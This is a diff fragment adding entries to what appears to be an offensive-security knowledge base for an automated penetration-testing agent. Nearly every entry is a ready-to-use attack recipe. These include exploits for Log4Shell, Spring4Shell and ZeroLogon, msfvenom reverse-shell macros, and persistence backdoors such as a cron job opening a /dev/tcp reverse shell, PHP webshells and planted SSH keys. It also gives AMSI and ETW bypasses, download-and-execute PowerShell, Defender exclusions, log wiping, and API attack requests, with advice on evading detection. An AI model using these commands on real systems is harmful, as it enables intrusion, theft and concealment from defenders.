+    "id": "lateral-movement-ssh-key-reuse",
+    "content": "SSH key and credential reuse across hosts\nTest found private key across all known hosts:\n  chmod 600 /tmp/id_rsa\n  for ip in <ip1> <ip2> <ip3>; do\n    echo -n \"$ip: \"; ssh -i /tmp/id_rsa -o StrictHostKeyChecking=no -o BatchMode=yes \\\n      -o ConnectTimeout=5 <user>@$ip 'whoami' 2>/dev/null || echo 'failed'\n  done\nTest all found usernames against all found hosts with all found passwords:\n  netexec ssh <cidr> -u users.txt -p passwords.txt --continue-on-success\nCredentials from one service often reused across: SSH, RDP, WinRM, SMB, VPN",
+    "metadata": {
+      "category": "lateral-movement",
+      "technique": "credential-reuse",
+      "tool": "ssh"
+    }
+  },
+  {
+    "id": "lateral-movement-pass-the-ticket",
+    "content": "Pass-the-Ticket (Kerberos ticket injection) lateral movement\nExport ticket (on Windows with Mimikatz): sekurlsa::tickets /export\nExport with Rubeus: Rubeus.exe dump /nowrap\nInject ticket (Linux): export KRB5CCNAME=/path/to/ticket.ccache\nUse with Impacket: impacket-smbclient -k -no-pass <domain>/<user>@<target>\nRequest TGT with password: impacket-getTGT <domain>/<user>:<pass>\nRequest TGT with hash: impacket-getTGT <domain>/<user> -hashes :<ntlm>\nKerberos auth bypasses NTLM detection \u2014 useful for evasion",
+    "metadata": {
+      "category": "lateral-movement",
+      "technique": "pass-the-ticket",
+      "tool": "impacket"
+    }
+  },
+  {
+    "id": "lateral-movement-dcom",
+    "content": "DCOM lateral movement (no SMB required, uses port 135 + dynamic RPC)\nUsing impacket-dcomexec:\n  impacket-dcomexec <domain>/<user>:<pass>@<target> 'whoami'\n  impacket-dcomexec <domain>/<user>@<target> -hashes :<ntlm> 'whoami'\nDCOM objects usable: ShellWindows, ShellBrowserWindow, MMC20.Application\nObject selection: impacket-dcomexec ... -object MMC20\nAdvantage: avoids SMB-based detections (no ADMIN$ share access needed)\nRequires: admin credentials, DCOM not blocked by firewall",
+    "metadata": {
+      "category": "lateral-movement",
+      "technique": "dcom",
+      "tool": "impacket"
+    }
+  },
+  {
+    "id": "lateral-movement-runas-creds",
+    "content": "Running processes as another user with found credentials\nLinux \u2014 sudo with password:\n  echo '<password>' | sudo -S -u <user> <command>\nLinux \u2014 su to another user:\n  su - <user>  (enter password when prompted)\nLinux \u2014 run as another user via sshpass:\n  sshpass -p '<pass>' ssh <user>@localhost\nWindows (from cmd/PS):\n  runas /user:<domain>\\<user> cmd.exe\nWindows PTH with Overpass-the-Hash:\n  Invoke-Mimikatz -Command 'sekurlsa::pth /user:<u> /domain:<d> /ntlm:<hash>'",
+    "metadata": {
+      "category": "lateral-movement",
+      "technique": "runas",
+      "tool": "bash"
+    }
+  },
+  {
+    "id": "initial-access-log4shell",
+    "content": "Log4Shell (CVE-2021-44228) \u2014 Log4j2 JNDI RCE\nAffected: Log4j2 2.0-beta9 to 2.14.1 \u2014 Java apps using log4j for logging\nDetection: inject JNDI string into logged fields (User-Agent, X-Forwarded-For, username)\n  curl -H 'X-Api-Version: ${jndi:ldap://<attacker_ip>:1389/a}' http://<target>/\n  curl -H 'User-Agent: ${jndi:ldap://<attacker_ip>:1389/a}' http://<target>/\nOut-of-band detection: listen for LDAP/DNS callback\n  nc -lvnp 1389  (or use interactsh: interactsh-client)\nExploitation: Metasploit: use exploit/multi/misc/log4shell_header_injection\nNuclei: nuclei -u <target> -t /root/nuclei-templates/cves/2021/CVE-2021-44228.yaml\nWaf bypass: ${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://...}",
+    "metadata": {
+      "category": "initial-access",
+      "technique": "log4shell",
+      "tool": "curl"
+    }
+  },
+  {
+    "id": "initial-access-spring4shell",
+    "content": "Spring4Shell (CVE-2022-22965) \u2014 Spring Framework RCE\nAffected: Spring Framework < 5.3.18 or < 5.2.20 on JDK 9+, deployed as WAR on Tomcat\nDetection: check Spring version in response headers or error pages\nExploit: writes a JSP webshell via class.module.classLoader property binding\n  curl -X POST 'http://<target>/path' \\\n    --data 'class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B ...' \nNuclei template: nuclei -u <target> -t cves/2022/CVE-2022-22965.yaml\nWebshell access after exploit: curl 'http://<target>/tomcatwar.jsp?pwd=j&cmd=id'",
+    "metadata": {
+      "category": "initial-access",
+      "technique": "spring4shell",
+      "tool": "curl"
+    }
+  },
+  {
+    "id": "initial-access-proxyshell",
+    "content": "ProxyShell (CVE-2021-34473 + CVE-2021-34523 + CVE-2021-31207) \u2014 Exchange RCE\nAffected: Microsoft Exchange Server 2013/2016/2019 unpatched before May 2021\nDetection: check Exchange version at /owa/ or autodiscover endpoint\nThree-stage chain: SSRF auth bypass \u2192 privilege escalation \u2192 arbitrary write\nTest with nuclei: nuclei -u https://<exchange_host> -t cves/2021/CVE-2021-34473.yaml\nMetasploit: use exploit/windows/http/exchange_proxyshell_rce\n  set RHOSTS <exchange_ip>; set EMAIL <valid_email@domain.com>; run\nManual PoC: github.com/GossiTheDog/ExchangeRCE\nResult: SYSTEM shell on Exchange server",
+    "metadata": {
+      "category": "initial-access",
+      "technique": "proxyshell",
+      "tool": "msfconsole"
+    }
+  },
+  {
+    "id": "initial-access-proxylogon",
+    "content": "ProxyLogon (CVE-2021-26855 + CVE-2021-27065) \u2014 Exchange pre-auth SSRF + write\nAffected: Exchange 2013/2016/2019 unpatched before March 2021\nDetection: /owa/ login page accessible, check Exchange build number\nStage 1: SSRF via CVE-2021-26855 to bypass auth\nStage 2: write webshell via CVE-2021-27065 (arbitrary file write)\nNuclei: nuclei -u https://<exchange_host> -t cves/2021/CVE-2021-26855.yaml\nMetasploit: use exploit/windows/http/exchange_proxylogon_rce\n  set RHOSTS <exchange_ip>; set EMAIL <email@domain.com>; run\nWebshell lands in Exchange installation path \u2014 SYSTEM level",
+    "metadata": {
+      "category": "initial-access",
+      "technique": "proxylogon",
+      "tool": "msfconsole"
+    }
+  },
+  {
+    "id": "initial-access-zerologon",
+    "content": "ZeroLogon (CVE-2020-1472) \u2014 Netlogon authentication bypass \u2192 Domain Controller compromise\nAffected: Windows Server 2008/2012/2016/2019 DCs unpatched before Aug 2020\nDetection: nmap shows port 135/445 open on Windows host with DC role\nTest (non-destructive): python3 zerologon_tester.py <dc_name> <dc_ip>\n  github.com/SecuraBV/CVE-2020-1472\nExploit (resets DC machine account password to empty):\n  python3 cve-2020-1472-exploit.py <dc_name> <dc_ip>\nPost-exploit (secretsdump with empty password):\n  impacket-secretsdump <domain>/<dc_name>\\$@<dc_ip> -no-pass -just-dc\nWARNING: resets DC machine account \u2014 restore immediately after to avoid domain issues",
+    "metadata": {
+      "category": "initial-access",
+      "technique": "zerologon",
+      "tool": "impacket"
+    }
+  },
+  {
+    "id": "initial-access-citrix-bleed",
+    "content": "Citrix Bleed (CVE-2023-4966) \u2014 Citrix ADC/Gateway session token leak\nAffected: Citrix ADC and Gateway before specific patch dates (Oct 2023)\nDetection: /vpn/index.html accessible, check product version\nExploit: sends oversized HTTP Host header to leak session tokens from memory\n  nuclei -u https://<target> -t cves/2023/CVE-2023-4966.yaml\nManual: curl -H 'Host: <target>' --path-as-is 'https://<target>/oauth/idp/.well-known/openid-configuration'\nLeaked token allows auth bypass without credentials\nTool: github.com/rwincey/CVE-2023-4966 or Metasploit module when available",
+    "metadata": {
+      "category": "initial-access",
+      "technique": "citrix-bleed",
+      "tool": "nuclei"
+    }
+  },
+  {
+    "id": "initial-access-msfvenom-office-macro",
+    "content": "Office macro payload generation with msfvenom\nGenerate VBA macro payload:\n  msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<ip> LPORT=4444 \\\n    -f vba -o /work/macro.vba\nGenerate HTA (HTML Application) payload:\n  msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<ip> LPORT=4444 \\\n    -f hta-psh -o /work/payload.hta\nSet up handler before delivering:\n  msfconsole -q -x \"use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; \\\n    set LHOST <ip>; set LPORT 4444; run; exit\"\nFor phishing: embed VBA in .docm, deliver HTA via link or attachment",
+    "metadata": {
+      "category": "initial-access",
+      "technique": "office-macro",
+      "tool": "msfvenom"
+    }
+  },
+  {
+    "id": "initial-access-lnk-shortcut",
+    "content": "Malicious LNK shortcut payload for initial access\nCreate LNK that executes PowerShell on open:\n  Use PowerShell or lnkup to generate:\n  python3 lnkup.py --host <attacker_ip> --type ntlm --output /work/payload.lnk\n  (captures NTLM hash when target navigates to folder containing LNK)\nLNK with command execution:\n  Target: C:\\Windows\\System32\\cmd.exe\n  Arguments: /c powershell -ep bypass -enc <base64_payload>\nDelivery: place in accessible share, email attachment, or USB\nFor NTLM capture: responder -I <interface> to catch incoming authentication",
+    "metadata": {
+      "category": "initial-access",
+      "technique": "lnk-shortcut",
+      "tool": "responder"
+    }
+  },
+  {
+    "id": "initial-access-default-service-creds",
+    "content": "Default credential exploitation for initial access via network services\nApproach: enumerate exposed services, check default credentials before CVE hunting\nCommon high-value default credential targets:\n  Tomcat: tomcat/tomcat, tomcat/s3cret, admin/admin \u2192 /manager/html\n  Jenkins: admin/admin, admin/<blank> \u2192 /login\n  JBoss/WildFly: admin/admin \u2192 :9990/console\n  Weblogic: weblogic/weblogic1 \u2192 :7001/console\n  Printers/embedded: admin/admin, admin/<blank>, admin/1234\n  Network devices: admin/admin, cisco/cisco, enable/enable\n  Database: root/<blank>, sa/<blank> (MSSQL), postgres/postgres\nSearch KB: search_memory(collection='knowledge', query='<service> default credentials')",
+    "metadata": {
+      "category": "initial-access",
+      "technique": "default-creds",
+      "tool": "netexec"
+    }
+  },
+  {
+    "id": "initial-access-subdomain-takeover",
+    "content": "Subdomain takeover for initial access / phishing infrastructure\nCondition: DNS CNAME or A record points to deprovisioned cloud service\nDetection: dig <subdomain> \u2192 CNAME to <something>.azurewebsites.net / cloudfront / s3\nTest if claimable: try to create/register the pointed-to resource\n  curl -s <subdomain> \u2014 NXDOMAIN or specific error from cloud provider\nVulnerable providers and error messages:\n  AWS S3: 'NoSuchBucket', GitHub Pages: 'There isn't a GitHub Pages site here'\n  Azure: 'Web App - Unavailable', Heroku: 'No such app'\nClaim the resource and host content to confirm full control\nImpact: phishing via trusted subdomain, session cookie theft via same-origin",
+    "metadata": {
+      "category": "initial-access",
+      "technique": "subdomain-takeover",
+      "tool": "dig"
+    }
+  },
+  {
+    "id": "persistence-windows-registry-run",
+    "content": "Windows Registry Run key persistence\nHKCU (current user, no admin needed):\n  reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run \\\n    /v Updater /t REG_SZ /d 'C:\\path\\to\\payload.exe' /f\nHKLM (all users, requires admin):\n  reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run \\\n    /v Updater /t REG_SZ /d 'C:\\path\\to\\payload.exe' /f\nVerify: reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\nOther keys: RunOnce (single execution), RunOnceEx\nDetection: Autoruns.exe, Sysmon EventID 13",
+    "metadata": {
+      "category": "persistence",
+      "technique": "registry-run",
+      "tool": "reg"
+    }
+  },
+  {
+    "id": "persistence-windows-scheduled-task-persist",
+    "content": "Windows scheduled task for persistence (distinct from privesc use)\nCreate task running as SYSTEM:\n  schtasks /create /tn 'WindowsUpdate' /tr 'C:\\path\\payload.exe' \\\n    /sc onlogon /ru SYSTEM /f\nRun every 5 minutes:\n  schtasks /create /tn 'HealthCheck' /tr 'powershell -ep bypass -f C:\\beacon.ps1' \\\n    /sc minute /mo 5 /ru SYSTEM /f\nList tasks: schtasks /query /fo LIST /v | findstr 'TaskName\\|Run As User'\nDelete: schtasks /delete /tn 'WindowsUpdate' /f\nPowerShell: Register-ScheduledTask -TaskName 'Update' -Action $action -Trigger $trigger",
+    "metadata": {
+      "category": "persistence",
+      "technique": "scheduled-task",
+      "tool": "schtasks"
+    }
+  },
+  {
+    "id": "persistence-windows-service",
+    "content": "Windows service installation for persistence (requires admin)\nCreate service:\n  sc create SvcName binpath= 'C:\\path\\payload.exe' start= auto\n  sc start SvcName\nService that runs command:\n  sc create SvcName binpath= 'cmd.exe /k C:\\path\\script.bat' start= auto\nCheck status: sc query SvcName\nRemove: sc stop SvcName && sc delete SvcName\nUsing impacket remotely:\n  impacket-smbexec creates a service, runs command, then deletes service\nDetection: EventID 7045 (Service Control Manager), Sysmon process create",
+    "metadata": {
+      "category": "persistence",
+      "technique": "windows-service",
+      "tool": "sc"
+    }
+  },
+  {
+    "id": "persistence-linux-cron",
+    "content": "Linux cron backdoor for persistence\nAdd to system crontab (requires root):\n  echo '* * * * * root bash -i >& /dev/tcp/<ip>/4444 0>&1' >> /etc/crontab\nUser crontab (no root needed):\n  crontab -e  (add: * * * * * /tmp/.backdoor)\nOr directly: echo '* * * * * /tmp/.backdoor' | crontab -\nCron.d directory (root):\n  echo '* * * * * root /tmp/.backdoor' > /etc/cron.d/sys-update\nVerify: crontab -l && cat /etc/crontab && ls /etc/cron.d/\nEvery minute = noisiest; consider less frequent schedule to reduce detection",
+    "metadata": {
+      "category": "persistence",
+      "technique": "cron",
+      "tool": "bash"
+    }
+  },
+  {
+    "id": "persistence-linux-systemd",
+    "content": "Linux systemd service persistence (requires root)\nCreate service file:\n  cat > /etc/systemd/system/sys-update.service << 'EOF'\n  [Unit]\n  Description=System Update\n  [Service]\n  ExecStart=/tmp/.backdoor\n  Restart=always\n  [Install]\n  WantedBy=multi-user.target\n  EOF\nEnable and start:\n  systemctl daemon-reload\n  systemctl enable sys-update\n  systemctl start sys-update\nAdvantage: restarts on failure, survives reboots",
+    "metadata": {
+      "category": "persistence",
+      "technique": "systemd",
+      "tool": "systemctl"
+    }
+  },
+  {
+    "id": "persistence-linux-bashrc",
+    "content": "Linux shell profile persistence (no root for user-level)\nUser-level (survives user logout/login):\n  echo '/tmp/.backdoor &' >> ~/.bashrc\n  echo '/tmp/.backdoor &' >> ~/.bash_profile\n  echo '/tmp/.backdoor &' >> ~/.profile\nSystem-wide (requires root):\n  echo '/tmp/.backdoor &' >> /etc/profile\n  echo '/tmp/.backdoor &' >> /etc/bash.bashrc\nStealthy: add sleep to delay execution and avoid immediate detection\n  echo 'sleep 60 && /tmp/.backdoor &' >> ~/.bashrc\nNote: only triggers when user opens interactive shell \u2014 not on service restart",
+    "metadata": {
+      "category": "persistence",
+      "technique": "bashrc",
+      "tool": "bash"
+    }
+  },
+  {
+    "id": "persistence-ssh-authorized-keys",
+    "content": "SSH authorized_keys persistence (no root for user-level)\nGenerate keypair on attacker machine: ssh-keygen -t rsa -b 4096 -f /tmp/backdoor_key\nAdd public key to target:\n  mkdir -p ~/.ssh && chmod 700 ~/.ssh\n  echo '<attacker_public_key>' >> ~/.ssh/authorized_keys\n  chmod 600 ~/.ssh/authorized_keys\nRoot (system-wide): echo '<pub_key>' >> /root/.ssh/authorized_keys\nConnect back: ssh -i /tmp/backdoor_key <user>@<target> -o StrictHostKeyChecking=no\nVery persistent \u2014 survives password changes\nDetection: check ~/.ssh/authorized_keys for unexpected keys",
+    "metadata": {
+      "category": "persistence",
+      "technique": "ssh-keys",
+      "tool": "ssh"
+    }
+  },
+  {
+    "id": "persistence-webshell",
+    "content": "Web shell persistence on compromised web server\nPHP one-liner:\n  echo '<?php system($_GET[\"cmd\"]); ?>' > /var/www/html/status.php\nPHP with password protection:\n  echo '<?php if($_GET[\"k\"]==\"<secret>\"){system($_GET[\"c\"]);} ?>' > /var/www/html/util.php\nJSP (Tomcat): write to webapps directory\nASPX (IIS): write to web root\nTest: curl 'http://<target>/status.php?cmd=id'\nFor stealth: use legitimate-looking filenames (health.php, ping.php, api.php)\nAlso add to cron for re-establishment if deleted:\n  echo '*/5 * * * * echo \"<?php system(\\$_GET[c]); ?>\" > /var/www/html/x.php' | crontab -",
+    "metadata": {
+      "category": "persistence",
+      "technique": "webshell",
+      "tool": "bash"
+    }
+  },
+  {
+    "id": "defense-evasion-amsi-bypass",
+    "content": "AMSI (Antimalware Scan Interface) bypass in PowerShell\nMemory patch (most reliable):\n  [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)\nForce error method:\n  $a=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils');$b=$a.GetField('amsiContext','NonPublic,Static');$c=$b.GetValue($null);[Runtime.InteropServices.Marshal]::WriteInt32($c,0x41424344)\nUse obfuscated version to avoid signature detection:\n  Split strings, use variable substitution, encode with base64\nVerify bypass: [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').GetValue($null)\nReturns True = AMSI bypassed",
+    "metadata": {
+      "category": "defense-evasion",
+      "technique": "amsi-bypass",
+      "tool": "powershell"
+    }
+  },
+  {
+    "id": "defense-evasion-ps-execution-policy",
+    "content": "PowerShell execution policy bypass\nRun script bypassing policy:\n  powershell -ep bypass -f script.ps1\n  powershell -ExecutionPolicy Bypass -File script.ps1\nInline command:\n  powershell -ep bypass -c \"<command>\"\nEncode command (avoids quote hell):\n  $cmd = '<command>'\n  $enc = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($cmd))\n  powershell -enc $enc\nDownload and execute in memory (no disk write):\n  powershell -ep bypass -c \"IEX(New-Object Net.WebClient).DownloadString('http://<ip>/script.ps1')\"\nShort form: iex(iwr 'http://<ip>/script.ps1' -UseBasicParsing)",
+    "metadata": {
+      "category": "defense-evasion",
+      "technique": "ps-execution-policy",
+      "tool": "powershell"
+    }
+  },
+  {
+    "id": "defense-evasion-certutil-lolbin",
+    "content": "certutil.exe LOLBin \u2014 file download and decode (Windows built-in)\nDownload file:\n  certutil -urlcache -split -f http://<ip>/payload.exe C:\\Windows\\Temp\\update.exe\nEncode file to base64:\n  certutil -encode payload.exe payload.b64\nDecode base64:\n  certutil -decode payload.b64 payload.exe\nNote: certutil download is logged in DNS and network \u2014 detectable\nDefender detects the -urlcache flag \u2014 try obfuscation:\n  certutil /urlcache /split /f http://<ip>/payload.exe output.exe\nAlternative downloads: bitsadmin, mshta, msiexec, wmic, curl (Windows 10+)",
+    "metadata": {
+      "category": "defense-evasion",
+      "technique": "lolbins",
+      "tool": "certutil"
+    }
+  },
+  {
+    "id": "defense-evasion-mshta-lolbin",
+    "content": "mshta.exe LOLBin \u2014 execute HTA files and VBScript (Windows built-in)\nExecute remote HTA:\n  mshta http://<attacker_ip>/payload.hta\nExecute VBScript inline:\n  mshta vbscript:Execute(\"CreateObject('WScript.Shell').Run('cmd /c whoami > C:\\\\out.txt')\")\nExecute JavaScript inline:\n  mshta javascript:a=new%20ActiveXObject('WScript.Shell');a.run('cmd /c whoami');close()\nHTA file template:\n  <html><head><script language='VBScript'>\n  Set objShell = CreateObject('WScript.Shell')\n  objShell.Run 'cmd /c <command>'\n  </script></head></html>\nmshta is often trusted by old AV \u2014 blocked by modern EDR on most endpoints",
+    "metadata": {
+      "category": "defense-evasion",
+      "technique": "lolbins",
+      "tool": "mshta"
+    }
+  },
+  {
+    "id": "defense-evasion-payload-encoding",
+    "content": "Payload encoding and obfuscation to evade signature detection\nBase64 encode PowerShell command:\n  python3 -c \"import base64; print(base64.b64encode('whoami'.encode('utf-16-le')).decode())\"\n  Run: powershell -enc <base64>\nXOR encode shellcode:\n  python3 -c \"sc=b'\\x90...'; key=0x41; print([b^key for b in sc])\"\nString concatenation in PS (evades static signatures):\n  $cmd = 'wh'+'oa'+'mi'; iex $cmd\nChar codes:\n  $s=[char]119+[char]104+[char]111+[char]97+[char]109+[char]105; iex $s\nCompress+encode payload: [IO.MemoryStream]|Out-GZipStream pipeline\nGoal: change bytes enough to avoid hash/signature match without breaking execution",
+    "metadata": {
+      "category": "defense-evasion",
+      "technique": "encoding",
+      "tool": "python3"
+    }
+  },
+  {
+    "id": "defense-evasion-log-clearing",
+    "content": "Log and artifact clearing (do only if explicitly tasked \u2014 destructive)\nWindows Event logs:\n  wevtutil cl System && wevtutil cl Security && wevtutil cl Application\n  Clear specific log: wevtutil cl 'Microsoft-Windows-PowerShell/Operational'\n  PowerShell: Clear-EventLog -LogName Security\nLinux bash history:\n  history -c && history -w\n  unset HISTFILE && export HISTSIZE=0\n  rm -f ~/.bash_history && ln -s /dev/null ~/.bash_history\nLinux log files:\n  > /var/log/auth.log && > /var/log/syslog && > /var/log/messages\n  find /var/log -name '*.log' -exec truncate -s 0 {} \\;\nNote: clearing logs creates a gap that is itself suspicious \u2014 modern SIEMs detect this",
+    "metadata": {
+      "category": "defense-evasion",
+      "technique": "log-clearing",
+      "tool": "bash"
+    }
+  },
+  {
+    "id": "defense-evasion-defender-exclusion",
+    "content": "Windows Defender exclusion abuse (requires admin)\nAdd path exclusion:\n  Set-MpPreference -ExclusionPath 'C:\\Windows\\Temp'\n  powershell -ep bypass -c \"Set-MpPreference -ExclusionPath 'C:\\Tools'\"\nAdd extension exclusion:\n  Set-MpPreference -ExclusionExtension '.exe'\nAdd process exclusion:\n  Set-MpPreference -ExclusionProcess 'beacon.exe'\nDisable real-time protection (very noisy, use exclusions instead):\n  Set-MpPreference -DisableRealtimeMonitoring $true\nCheck current exclusions:\n  Get-MpPreference | Select-Object ExclusionPath,ExclusionProcess,ExclusionExtension\nRequires: local admin or SYSTEM \u2014 detected by Defender tamper protection on newer builds",
+    "metadata": {
+      "category": "defense-evasion",
+      "technique": "av-exclusion",
+      "tool": "powershell"
+    }
+  },
+  {
+    "id": "defense-evasion-etw-bypass",
+    "content": "ETW (Event Tracing for Windows) bypass to reduce PowerShell visibility\nPatch ETW provider in PowerShell:\n  [Reflection.Assembly]::LoadWithPartialName('System.Core')\n  $a=[System.Diagnostics.Eventing.EventProvider]\n  $b=$a.GetField('m_enabled','NonPublic,Instance')\n  $c=[Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider')\n  $d=$c.GetField('etwProvider','NonPublic,Static').GetValue($null)\n  $b.SetValue($d,0)\nSimpler PowerShell ETW disable:\n  [System.Diagnostics.Eventing.EventProvider].GetField('m_enabled','NonPublic,Instance').SetValue([Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider').GetField('etwProvider','NonPublic,Static').GetValue($null),0)\nDisables PowerShell script block logging for the current session",
+    "metadata": {
+      "category": "defense-evasion",
+      "technique": "etw-bypass",
+      "tool": "powershell"
+    }
+  },
+  {
+    "id": "api-security-enumeration",
+    "content": "API endpoint enumeration\nCommon API paths to check first:\n  /api/, /api/v1/, /api/v2/, /rest/, /graphql, /swagger.json, /openapi.json\n  /api-docs, /.well-known/, /v1/, /v2/, /internal/api/\nffuf against API wordlist:\n  ffuf -u http://<target>/api/FUZZ \\\n    -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt -mc 200,201,204,401\nParameter discovery with Arjun:\n  arjun -u http://<target>/api/endpoint -m GET\n  arjun -u http://<target>/api/endpoint -m POST\nParse Swagger/OpenAPI for all endpoints:\n  curl -s http://<target>/swagger.json | jq '.paths | keys'\n  curl -s http://<target>/openapi.json | jq '[.paths | to_entries[] | .key]'",
+    "metadata": {
+      "category": "api-security",
+      "technique": "enumeration",
+      "tool": "ffuf"
+    }
+  },
+  {
+    "id": "api-security-bola-idor",
+    "content": "BOLA/IDOR in REST APIs \u2014 Broken Object Level Authorization\nPattern: authenticated request accesses another user's object by changing ID\nPath-based IDs:\n  curl -s -H 'Authorization: Bearer <token>' http://<target>/api/users/2\n  curl -s -H 'Authorization: Bearer <token>' http://<target>/api/orders/1\n  Increment/decrement/try 0, negative, UUID variants\nParameter-based:\n  curl -s -H 'Authorization: Bearer <token>' 'http://<target>/api/profile?user_id=2'\nRequest body:\n  curl -s -X PUT -H 'Authorization: Bearer <token>' \\\n    -d '{\"user_id\": 2, \"email\": \"attacker@test.com\"}' http://<target>/api/profile\nConfirmed when: response 200 with different user's data OR action succeeds on other account\nTest with two accounts: token from account A to access account B's resources",
+    "metadata": {
+      "category": "api-security",
+      "technique": "bola-idor",
+      "tool": "curl"
+    }
+  },
+  {
+    "id": "api-security-mass-assignment",
+    "content": "Mass assignment vulnerability in REST APIs\nCondition: API accepts extra fields in request body and applies them to the object\nDiscovery: compare API request vs database/response fields \u2014 what's in response but not in docs?\nTest: send extra fields not in the documented request schema:\n  curl -X POST -H 'Content-Type: application/json' \\\n    -d '{\"username\":\"attacker\",\"password\":\"test\",\"role\":\"admin\",\"is_admin\":true,\"credit\":99999}' \\\n    http://<target>/api/register\nCommon targets: role, is_admin, balance, credit, verified, approved, plan\nAfter registration/update: check if elevated role is granted\nAlso test on update endpoints:\n  curl -X PUT -H 'Authorization: Bearer <token>' \\\n    -d '{\"email\":\"new@email.com\",\"role\":\"admin\"}' http://<target>/api/profile",
+    "metadata": {
+      "category": "api-security",
+      "technique": "mass-assignment",
+      "tool": "curl"
+    }
+  },
+  {
+    "id": "api-security-key-leakage",
+    "content": "API key leakage discovery\nIn JavaScript files (loaded by browser):\n  curl -s http://<target>/app.js | grep -iE 'api.?key|secret|token|bearer|password' | head -20\n  curl -s http://<target>/main.js | grep -iE 'REACT_APP_|VUE_APP_|API_KEY' | head -20\nIn response headers:\n  curl -si http://<target>/api/endpoint | grep -iE 'x-api-key|authorization|x-token'\nIn HTML source:\n  curl -s http://<target>/ | grep -iE 'api.?key|data-token|data-secret' | head -10\nIn .env file (see web-sensitive-files): curl -s http://<target>/.env\nIn git history (if .git exposed): git log --all --oneline | xargs git show | grep -i key\nCheck GitHub/public repos: search for target domain + 'api_key' or 'secret'",
+    "metadata": {
+      "category": "api-security",
+      "technique": "key-leakage",
+      "tool": "curl"
+    }
+  },
+  {
+    "id": "api-security-rate-limit-bypass",
+    "content": "API rate limit bypass techniques\nIP rotation via headers (if server trusts these):\n  X-Forwarded-For: <random_ip>\n  X-Real-IP: <random_ip>\n  X-Originating-IP: <random_ip>\n  True-Client-IP: <random_ip>\nTest: send 100 requests with rotating X-Forwarded-For and check if all succeed\nAccount rotation: create multiple accounts, rotate tokens\nEndpoint variation: /api/v1/resource vs /api/v1/resource/ (trailing slash) \u2014 different counter?\nParameter variation: add unused parameter (?cache=1, ?_=<timestamp>)\nNull byte bypass: /api/resource%00 \u2014 may bypass WAF/rate limiter\nHTTP method rotation: GET vs POST vs HEAD against same endpoint",
+    "metadata": {
+      "category": "api-security",
+      "technique": "rate-limit-bypass",
+      "tool": "curl"
+    }
+  },
+  {
+    "id": "api-security-jwt-manipulation",
+    "content": "JWT (JSON Web Token) manipulation attacks\nDecode token (no key needed): echo '<token>' | cut -d. -f2 | base64 -d 2>/dev/null\nNone algorithm attack:\n  Change header alg to 'none', remove signature, keep trailing dot\n  '{\"alg\":\"none\",\"typ\":\"JWT\"}' \u2192 base64 + '.' + payload_base64 + '.'\nRS256 to HS256 attack:\n  If server uses RS256 public key \u2014 sign with HS256 using public key as secret\njwk header injection:\n  Inject your own JWK into the token header, sign with your private key\nBrute force weak secret:\n  hashcat -a 0 -m 16500 <token> /usr/share/wordlists/rockyou.txt\nTool: jwt_tool -t <token> -M at (runs all attack modes)\n  github.com/ticarpi/jwt_tool",
+    "metadata": {
+      "category": "api-security",
+      "technique": "jwt-attacks",
+      "tool": "jwt_tool"
+    }
+  },
+  {
+    "id": "network-services-smb",
+    "content": "SMB service enumeration and exploitation\nBasic info: netexec smb <target> \u2014 shows OS, signing, SMBv1\nNull session check: smbclient -L //<target> -N\nShare enumeration with creds: smbclient -L //<target> -U '<user>%<pass>'\nMount share: smbclient //<target>/<share> -U '<user>%<pass>'\nenum4linux (comprehensive): enum4linux-ng <target> -A\nIf SMB signing disabled: vulnerable to NTLM relay\n  Responder + ntlmrelayx: python3 ntlmrelayx.py -smb2support -t <target>\nNull session gives users/shares: store as vulnerability severity=medium\nSMBv1 enabled: check for EternalBlue (MS17-010) \u2014 see cve-ms17-010-eternalblue",
+    "metadata": {
+      "category": "network-services",
+      "technique": "smb",
+      "tool": "netexec"
+    }
+  },
+  {
+    "id": "network-services-ftp",
+    "content": "FTP service enumeration and exploitation\nAnonymous login test: ftp -n <target> <<EOF\\nuser anonymous anonymous\\nls\\nEOF\nOr: curl -s ftp://<target>/ --user anonymous:anonymous\nnmap script: nmap -p 21 --script ftp-anon,ftp-bounce <target>\nAnonymous login success = store as vulnerability severity=medium\nIf writable: upload webshell (if web-accessible path), or upload SSH key\nBanner grab: nc -w 3 <target> 21 \u2014 check version for CVEs\nCheck for vsftpd 2.3.4 backdoor: see cve-vsftpd-234\nProFTPd mod_copy: see cve-2015-3306-proftpd\nBrute force: hydra -L users.txt -P pass.txt ftp://<target>",
+    "metadata": {
+      "category": "network-services",
+      "technique": "ftp",
+      "tool": "ftp"
+    }
+  },
+  {
+    "id": "network-services-snmp",
+    "content": "SNMP enumeration (UDP port 161)\nnmap detection: nmap -sU -p 161 --script snmp-info,snmp-sysdescr <target>\nCommunity string brute: onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt <target>\nWalk with 'public' community: snmpwalk -v2c -c public <target> 2>/dev/null | head -50\nsnmp-check (more readable): snmp-check <target> -c public\nGet system info: snmpget -v2c -c public <target> 1.3.6.1.2.1.1.1.0\nEnumerate users (Windows): snmpwalk -v2c -c public <target> 1.3.6.1.4.1.77.1.2.25\nEnumerate running processes: snmpwalk -v2c -c public <target> 1.3.6.1.2.1.25.4.2.1.2\n'public' works = store as vulnerability severity=medium (info disclosure)",
+    "metadata": {
+      "category": "network-services",
+      "technique": "snmp",
+      "tool": "snmpwalk"
+    }
+  },
+  {
